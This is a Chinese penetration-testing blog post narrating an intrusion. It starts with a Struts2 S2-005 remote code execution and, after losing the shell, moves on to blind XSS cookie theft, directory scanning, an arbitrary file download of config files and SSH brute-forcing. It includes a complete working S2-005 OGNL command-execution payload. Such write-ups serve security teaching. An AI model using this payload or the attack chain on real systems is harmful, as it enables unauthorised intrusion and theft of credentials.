“来骗、来偷袭”攻击我这脆弱的“老”系统，不讲“武”德
！
原创雪狼别动队 酒仙桥六号部队
2021-01-06原文
这是 酒仙桥六号部队 的第 143 篇文章。
全文共计6925个字，预计阅读时长20分钟。
在渗透测试中，有这么一句俗语："一杯茶、一包烟、一个破站盯一
天"。因为会有N多种场景暴露在任务当中，如果心态提前崩溃的话
，可能会前功尽弃。
为了方便大家阅读简单，在文章开头我们先简单梳理渗透流程。
渗透成功
突然接到一个系统的测试，非常紧急，拿到目标后，大概看了看，
当然这个漏洞很老了，很少有的了，运气好碰到了。还是个Struts
2远程命令执行。
Struts2-005 是 由 于 官 方 在 修 补 Struts2-
003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对
象 必 须 要 使 用 # 符 号 ， S2-
003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u00
23 或 者 8 进 制 \43 绕 过 。 S2-
005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），
再次造成漏洞。
Poc：
?(\'\\u0023context\[\\\'xwork.MethodAccessor.denyMethodExecution
\\\'\]\\u003dfalse\')(bla)(bla)&(\'\\u0023_memberAccess.excludeP
roperties\\u003d\@java.util.Collections\@EMPTY_SET\')(kxlzx)(kxl
zx)&(\'\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue\'
)(bla)(bla)&(\'\\u0023mycmd\\u003d\\\'ipconfig\\\'\')(bla)(bla)&
(\'\\u0023myret\\u003d\@java.lang.Runtime\@getRuntime().exec(\\u
0023mycmd)\')(bla)(bla)&(A)((\'\\u0023mydat\\u003dnew\\40java.io
.DataInputStream(\\u0023myret.getInputStream())\')(bla))&(B)((\'
\\u0023myres\\u003dnew\\40byte\[51020\]\')(bla))&(C)((\'\\u0023m
ydat.readFully(\\u0023myres)\')(bla))&(D)((\'\\u0023mystr\\u003d
new\\40java.lang.String(\\u0023myres)\')(bla))&(\'\\u0023myout\\
u003d\@org.apache.struts2.ServletActionContext\@getResponse()\')
(bla)(bla)&(E)((\'\\u0023myout.getWriter().println(\\u0023mystr)
\')(bla))
成功GetSehll后发现里面的环境很多，支持：Python、Java、PH
P等。推测是个集成环境的服务器。我以为是Linux，进去一看Win
dows，这倒还好，应该比较容易提权...就没太在意。烟灰缸里的
烟头和已经空空如也的保温杯也提醒我今晚上可以收工了。只等明
天睡到自然醒，提权+内网漫游，美滋滋！
沏上茶，点上烟，回来准备内网渗透的时候...
权限丢失
回来准备内网渗透的时候发现权限没维持好，给弄丢了。心急如焚
，闹心吧啦的。
于是再次从原来的路径尝试，发现漏洞也已经被修复了，原来打入
的WebShell也随之消失了，心里顿时"咯噔"一下...
这 我 就 不 乐 意 了 。 于 是 我 开 启 了 新 的 一 轮 收 集 ， 发 现 3306-
MySql服务是开放的，尝试连接了下，结果还失败了，说明该服务
拒绝了外部连接。
再次渗透
在主站重新逛了一下没找到其他可以利用的漏洞的地方，渗透陷入
了僵局。只能再次进行信息收集，使用rad浏览器爬虫对主站进行爬
虫。
rad ， 全 名 Radium ， 名 字 来 源 于 放 射 性 元 素 ------ 镭 ,
从一个URL开始，辐射到一整个站点空间,一款专为安全扫描而生的
浏览器爬虫。
------------by 官方介绍
Github: 
Rad没让我失望,没用多长时间就有了新的收获，它找到了一个IP，
上面80端口部署着一个疑似目标的应用。
逛了一下，发现有可交互的地方，于是尝试XSS跨站脚本的方式来做
个切入点。
简单的构造了下XSS语句，结果存在XSS跨站，可以执行前端语句，
说明可以渲染了。决定碰运气盲打下，于是我找到了一个类似留言
、咨询类似的功能尝试下。前提是要自己搭建好XSS跨站脚本平台。
备注：关于XSS跨站脚本平台，如果不懂其中的意思，读者可以自行
百度学习。
大概过了至少得1个月之后吧，收到了Cookie，这算运气好的了，
也有甚至2年，甚至更长的时间没有收到。原因很简单，要么XSS不
存在，要么漏洞已经修复了，没赶上管理员点开看。要么XSS在出去
的时候Cookie被拦截了，要么就是系统已经不存在了等各种原因会
出现收不到的情况。
成功后，会有相关的记录飞到你所搭建的XSS跨站平台内。
进入后台
开始逐步登录到后台系统中一探究竟，因后台有点繁琐，且不方便
透露过多的信息，就用文字大概描述下。
-账户管理
|
-------账户管理（增、删、改、查账户）
|
-------权限管理（增、删、改、查权限）
-内容管理
|
-------文章管理（增、删、改、查文章）
|
-------图片管理（增、删、改、查图片）
|
-------留言管理（删、查留言）
-数据分析
|
-------SEO优化（增、删、改、查内容搜索关键字）
|
-------访问量/点击率（查询访问量/点击率）
|
-------数据导出（选中数据后，一键导出）
-关于后台
|
-------后台信息（查询信息）
|
-------技术支持（查询信息）
列举了常见的后台功能，可以逐一的给予大面上的分析。如果在一
个渗透测试的视角来看的话。大概得都尝试下，比如：XSS、CSRF
、SSRF、后台SQL盲注、文件上传、文件下载、文件包含、水平越权、垂
直越权、信息泄露、URL跳转等漏洞攻击点。我尝试出的点在于：数据
导出，存在文件下载漏洞点。
扫描探测
问题来了，我要下载谁？目录从哪里获得？这里采用了一个比较笨
的办法，就是目录/文件扫描探测。所以我打算用下这款工具了。
这里需要注意的是，文件字典你可以自定义，也可以去下载。但是
在这里我用了叠加扫描手法。比如我扫描出了目标：目录，正常来说是后台，可以先访问下，
但是我想试试admin后面是否还有目录？那我在扫描的时候就直接写
[http://www.xxxxxx.com/admin/的方式继续扫描/admin/目
录后面的内容即可了。因为目录的后面大概率跟随的是文件。例如
：配置文件等敏感文件。
接着回到这个站，可能由于目录探测工具和这个站八字不合，换了
几个字典也没碰到。不过不要慌，现在目录探测工具种类繁多，并
且自带字典各有不同，换几个目录探测工具试试。
漫长的等待之后gobuster给我了惊喜，发现了个新目录/updatac
heck
其他目录访问重定向到首页，但是/updatecheck重定向到了：
页面存在任意文件下载漏洞。
文件下载
扫描文件的话就更随意了，工具也很随意。因为我的终极目标是找
到相关的conf、config类似的配置文件，我要利用文件下载漏洞
给把配置文件下载出来。
出现了站库分离的情况了...很简单的理解，数据库、网站，压根不
在同1个服务器上。
于是我开始尝试连接该服务器的MySql...
不行，看来只有所在网站服务器的IP地址是数据库的白名单...
暴力破解
于是我开始尝试该数据库IP地址的其他端口服务扫描探测，打开了
一个22端口的SSH，看来大概率的该数据库后台服务器是个Linux
，目前针对22端口的SSH服务，只能尝试暴力破解来碰运气了。爆
破之前，我先去百度查个资料。
爆破总得长个心眼，不光SSH，哪怕是WEB登录界面的爆破，我都会
去尝试搜索下弱口令top100、top1000的方式集成到个人字典当中
。
爆破的过程漫长且乏味~